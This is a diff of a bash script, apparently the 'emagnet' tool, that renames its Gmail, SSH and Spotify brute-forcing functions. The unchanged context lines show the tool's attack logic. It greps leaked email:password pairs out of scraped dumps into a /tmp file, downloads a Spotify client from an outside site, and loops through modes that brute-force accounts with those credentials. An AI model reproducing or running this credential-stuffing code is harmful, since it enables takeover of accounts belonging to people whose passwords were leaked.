@@ -467,7 +467,7 @@ blocked() {
 fi; 
 }
 
-spotifybruter() {
+emagnet_spotify_bruter() {
 VERSION="0.6.0"
 WWWSOURCE="https://nr1.nu/archive/sconsify"
 SCONSIFY="${WWWSOURCE}/linux-x86_64-sconsify-${VERSION}.next.zip"
@@ -496,7 +496,7 @@ SPOTIFY_PASS="$(echo $line|cut -d: -f2)"
 done < "/tmp/.emagnet-passwords.txt"
 }
 
-sshbruter() {
+emagnet_ssh_bruter() {
   hash "parallel" &> /dev/null
 ( [[ "$?" -ne "0" ]] && echo -e "$basename$0: internal error -- parallel package is required to be installed.."; exit 1 )
 if [[ -z "$SSHPASS" ]]; then
@@ -553,7 +553,7 @@ fi
     sleep 4
 }
 
-bruter() {
+emagnet_gmail_bruter() {
 if [[ eg=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b\\:.*$" $EMAGNETTEMP|grep '\S'|sed 's/|/:/g'|awk '{print $1}'|cut -d: -f2,3|uniq|grep -v '"'\|','\|'<' |grep -i gmail.com|wc -l) -gt "0" ]]; then
     grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" $EMAGNETTEMP|awk '{print $1}'|cut -d: -f2,3|uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v /|grep -i gmail.com >> /tmp/.emagnet-passwords.txt 
 
@@ -776,19 +776,19 @@ if [[ "$pt" -gt "0" ]] && [[ $"it" -gt "0" ]]; then
 if [[ "$GBRUTEFORCE" = "true" ]]; then
    printf "%64s \n\n" | tr ' ' '='
    printf "%14s";printf "BRUTE FORCING -- $(echo -e "\e[1;34mG\e[1;31mM\e[1;33mA\e[1;34mI\e[0;32mL\E[1;31m\e[0m") ACCOUNTS\e[0m\n\n"
-   bruter
+   emagnet_gmail_bruter
    sleep 2
 
 elif [[ "$SBRUTEFORCE" = "true" ]]; then
    printf "%64s \n\n" | tr ' ' '='
    printf "%19s";printf "BRUTE FORCING -- SSH ACCOUNTS\e[0m\n\n"
-   sshbruter
+   emagnet_ssh_bruter
    sleep 2
 
 elif [[ "$PBRUTEFORCE" = "true" ]]; then
    printf "%64s \n\n" | tr ' ' '='
    printf "%17s";printf "BRUTE FORCING -- SPOTIFY ACCOUNTS\e[0m\n\n"
-   spotifybruter
+   emagnet_spotify_bruter
    sleep 2
 
 else
@@ -860,18 +860,22 @@ for (( ; ; )); do
       banner
     emagnet2
   conf
+
        if [[ "$GBRUTEFORCE" = "true" ]]; then
-         bruter
+         emagnet_gmail_bruter
          mv "$EMAGNETTEMP/*" "$EMAGNETHOME/all-files" &> /dev/null
          rm "/tmp/.emagnet*"  &> /dev/null
+
        elif [[ "$SBRUTEFORCE" = "true" ]]; then
-         sshbruter
+         emagnet_ssh_bruter
          mv "$EMAGNETTEMP/*" "$EMAGNETHOME/all-files" &> /dev/null
          rm "/tmp/.emagnet*"  &> /dev/null
+
        elif [[ "$PBRUTEFORCE" = "true" ]]; then 
-         spotifybruter
+         emagnet_spotify_bruter
          mv "$EMAGNETTEMP/*" "$EMAGNETHOME/all-files" &> /dev/null
          rm "/tmp/.emagnet*" &> /dev/null
+
        else
          mv "$EMAGNETTEMP/*" "$EMAGNETHOME/all-files" &> /dev/null
          rm "/tmp/.emagnet*"  &> /dev/null
@@ -930,7 +934,7 @@ if [[ $2 = "gmail" ]]; then
                 printf "%19s \e[1;31m$(echo -e "\e[1;34mG\e[1;31mM\e[1;33mA\e[1;34mi\e[0;32mL\e\e[0m") BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
                 printf "\n%64s \n\n" | tr ' ' '='
                 dontstopwhenfound
-                bruter
+                emagnet_gmail_bruter
                 mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null
         fi
 elif [[ $2 = "ssh" ]]; then
@@ -943,7 +947,7 @@ elif [[ $2 = "ssh" ]]; then
                 printf "%20s \e[1;34mSSH\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
                 printf "\n%64s \n\n" | tr ' ' '='
                 dontstopwhenfound
-                sshbruter
+                emagnet_ssh_bruter
         fi
                 mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null
 elif [[ $2 = "spotify" ]]; then
@@ -993,7 +997,7 @@ fi
                     printf "\n%64s \n\n" | tr ' ' '='
                     dontstopwhenfound
                 printf "\n%64s \n\n" | tr ' ' '='
-            spotifybruter
+            emagnet_spotify_bruter
         fi
             mv "$EMAGNETTEMP/*" "$EMAGNETHOME/all-files" &> /dev/null
 else
